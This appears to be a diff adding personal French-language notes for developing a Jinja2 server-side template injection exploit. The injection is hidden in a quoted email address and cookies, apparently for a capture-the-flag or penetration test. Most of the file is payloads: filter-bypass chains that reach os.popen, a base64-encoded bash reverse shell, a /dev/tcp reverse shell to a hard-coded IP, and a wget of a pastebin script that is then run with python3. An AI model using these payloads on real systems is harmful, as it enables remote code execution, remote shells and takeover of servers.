@@ -1,0 +1,130 @@
+"foo{%if(True)%}yay{%endif%}"@test.com.com  -> valide, permet d'utiliser ()
+"tesmut{%set(test=1)%}"@test.com.com -> invalide, impossible de remplacer les espaces par des parenthèses
+"foo{%%u0020set%u0020prev%u0020=%u00200%u0020%}"@test.com.com -> invalide, encodage unicode inutile
+
+pour bypass l'espace : trouver une variable qui contient un espace et l'utiliser
+
+on peut pas utiliser les guillemets mais on peut manipuler des strings déjà existantes pour récupérer v et l'executer (autre que email qui existe pas)
+mais il faut trouver un moyen de manipuler les strings sans les crochets et les underscores
+v=1&email="{%if(exec(email.index(0))==1)%}a{%endif%}"@test.com.com
+v=1&email="{%if(int(email.__getitem__(1))==1)%}a{%endif%}"@test.com.com
+v=1&email="{%if(len(email)!=1)%}a{%endif%}"@test.com.com
+c=1&email="{%if(str(1)==1)%}a{%endif%}"@test.com.com
+c=1&email="{%if(1|string()==1)%}a{%endif%}"@test.com.com -> valide
+"{%if((request.form.get(1|string()))==1)%}a{%endif%}"@test.com.com
+0=1&email="{%if((request|attr(values)|sort|first)==1|string)%}a{%endif%}"@test.com.com
+"{%if(request|attr(values)|list|length==0)%}nbv{%endif%}"@test.com.com -> length renvoie tjr 0 (même avec |list)
+
+
+# AVEC COOKIE 
+Cookie: 0=
+email="{%if(request.cookies.get(request.cookies|list|first)==256|string)%}o{%endif%}"%40a.com.com
+
+Cookie: 0=request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('sleep 5')['read']()
+email="{{request.cookies.get(request.cookies|list|first)}}"%40a.com.com
+
+Cookie: 0=request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('sleep 5')['read']()
+email="{{request.cookies.get(request.cookies|list|first)|safe}}"%40a.com.com
+
+chr(32) = ' '
+chr(40) = '_'
+il faut avoir la possiblité de concaténer des strings
+invalide : +, f"", " ".join(words)
+
+
+possibilité d'encoder le payload et de le décoder et l'exécuter
+# exemple de code python pour décoder le payload et l'exécuter
+"[payload]foo@test.com.com
+base64.decode(payload)
+exec(my_code)
+
+
+# PAYLOADS
+{% with a = request["application"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["popen"]("echo -n YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40LzkwMDEgMD4mMQ== | base64 -d | bash")["read"]() %} a {% endwith %}
+
+To inject code without flask auto encode
+{{'<script>alert(1);</script>'|safe}}
+#will be
+<script>alert(1);</script>
+
+https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti
+Without {{ . [ ] }} _
+{%with a=request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls${IFS}-l')|attr('read')()%}{%print(a)%}{%endwith%}
+
+https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/
+{% if request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('sleep 5')['read']() == 'chiv' %} a {% endif %}
+{{(request.application|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f(\x5f\x5fbuiltins\x5f\x5f)')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')).popen('sleep%205')|attr('read')()}}
+list|safe
+
+['__name__', '__doc__', '__package__', '__loader__', '__spec__', '__file__', '__cached__', '__builtins__', 'annotations', 'functools', 'json', 't', 'BytesIO', '_wsgi_decoding_dance', 'CombinedMultiDict', 'EnvironHeaders', 'FileStorage', 'ImmutableMultiDict', 'iter_multi_items', 'MultiDict', 'BadRequest', 'UnsupportedMediaType', 'default_stream_factory', 'FormDataParser', '_SansIORequest', 'cached_property', 'environ_property', '_get_server', 'get_input_stream', 'Request']
+
+{{(request.application|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')).popen('sleep%205')|attr('read')()}}
+"%c"%0x28
+
+
+
+{{((request.application|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f.\x5f\x5fgetitem\x5f\x5f'))('\x5f\x5fimport\x5f\x5f')('os')).popen('sleep%205')|attr('read')()}}
+
+{{(request.application|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')).popen('sleep%205').read()}}
+
+(request|attr("application"))['__globals__']['__builtins__']['__import__']('os')['popen']('sleep%205')['read']()
+
+{{(request.application)['__globals__']['__builtins__']['__import__']('os')['popen']('sleep%205')['read']()}}
+
+
+{{lipsum[a].os.popen(b).read()}}
+
+
+{%set(c)=request.cookies.get(request.cookies|list|first)%}{%if(c=="1")%}{%endif%}
+
+
+Cookie:__globals__=t;sleep 5=t;
+email={{(lipsum|attr(request.cookies|first)).os.popen(request.cookies|last).read()}}
+
+
+
+
+Cookie:__globals__=t;sleep 5=t;
+email="{%if((lipsum|attr(request.cookies|first)).os.popen(request.cookies|last).read())%}{%endif%}"@t.com.com
+
+
+14p.in
+234.pl
+23w.com
+
+
+
+bb2.ru
+
+
+
+Cookie:__globals__=t;sleep 5=t;
+email="{%if((lipsum|attr(request.cookies|first)).os.popen(request.cookies|last).read())%}{%endif%}"@bb2.ru
+
+
+
+
+/bin/bash -l > /dev/tcp/86.205.90.183/4242 0<&1 2>&1
+
+
+
+Cookie: __globals__=t;ls > /tmp/a && sleep 5=t
+email="{%if((lipsum|attr(request.cookies|first)).os.popen(request.cookies|last).read())%}{%endif%}"@bb2.ru
+
+======RESUME======
+
+List domain catch all pour accepter tous avant le @
+https://gist.github.com/doogaille/7dccd14803209ba53df5084663ce0938
+--> posibilité de vérifier leur validité avec burp suite intruder
+
+https://en.wikipedia.org/wiki/Email_address
+--> possibilité d'écrire un email sous la forme quoted : "Abc@def"@example.com
+--> accepte les ( ) --> posibilité d'utiliser {%if()%} et {%endif%}
+
+Reverse shell https://github.com/orestisfoufris/Reverse-Shell---Python/blob/master/reverseshell.py
+
+Cookie: __globals__=t;wget -O /tmp/a.py pastebin.com/raw/NsMXPZux && sleep 5=t;
+email="{%if((lipsum|attr(request.cookies|first)).os.popen(request.cookies|last).read())%}{%endif%}"@bb2.ru
+
+Cookie: __globals__=t;python3 /tmp/a.py && sleep 5=t;
+email="{%if((lipsum|attr(request.cookies|first)).os.popen(request.cookies|last).read())%}{%endif%}"@bb2.ru
